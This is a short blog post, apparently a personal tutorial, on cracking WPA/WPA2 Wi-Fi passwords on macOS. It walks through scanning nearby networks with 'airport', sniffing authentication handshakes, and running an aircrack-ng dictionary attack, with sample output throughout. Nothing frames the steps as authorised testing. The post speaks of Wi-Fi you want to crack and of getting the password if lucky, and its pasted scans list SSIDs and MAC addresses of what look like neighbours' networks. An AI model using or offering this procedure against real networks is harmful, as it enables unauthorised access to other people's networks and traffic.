---
layout: article
blogName: SunJK' Blog 
category: wifi
category_en: wifi
title: aircrack on mac
tags: icmp 
---
###  aircrack on mac with WPA/WPA2
* `airmon-ng` `airodump-ng` `aireplay-ng` doesn't work for mac<br>
* use `airport` on mac sniff authentication handshake<br>
* type `airport -s` on terminal, find channel of wifi which you wana crack
<pre>
                            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                 TP-LINK_HyFi_16 08:57:00:b8:42:16 -83  11,-1   Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
                   ChinaNet-PjnC b4:41:7a:b8:0c:e9 -58  11      Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) 
                       Cici_chen d0:c7:c0:1c:ac:60 -51  11,-1   Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
                          zdcnet 6c:e8:73:3a:2f:cc -88  6,+1    Y  US WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
                   TP-LINK_99999 20:dc:e6:3c:ff:6c -81  6       N  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
                       littlepig 00:23:cd:15:fd:2c -89  2,+1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
                        Tenda_XY c8:3a:35:4e:16:01 -64  1       Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) 
                   ChinaNet-6ecG b4:41:7a:b6:c1:5c -68  1       Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) 

</pre>

* type `sudo airport en0 sniff 1` to sniff authentication handshake.<br>
* download wifi crack dictionary , type `aircrack-ng -w wifi.txt authen.cap | grep 'handshake'`, find line which handshake count more than 0
<pre>
sunjk:wifi SunJK$ aircrack-ng -w wifi.txt a2.cap | grep 'handshake'
   1  80:71:7A:5A:C5:4C  HG532e-101                WPA (0 handshake)
   2  08:57:00:B8:73:92  TP-LINK_HyFi_16           WPA (1 handshake)
   5  D0:C7:C0:1C:AC:60  Cici_chen                 WPA (0 handshake)
   8  64:09:80:19:44:7F  DDD                       WPA (0 handshake)
</pre>
* type `aircrack-ng -w dic.txt authen.cap` , choose `Index number of target network ` that you found. 
* waiting for result.if you are lucky , you will get wifi password soon.

### External links:
_<http://www.aircrack-ng.org/doku.php?id=wpa_capture>_<br>
_<http://www.aircrack-ng.org/doku.php?id=cracking_wpa>_<br>
_<http://www.hsc.fr/ressources/articles/hakin9_wifi/hakin9_wifi_EN.pdf>_<br>

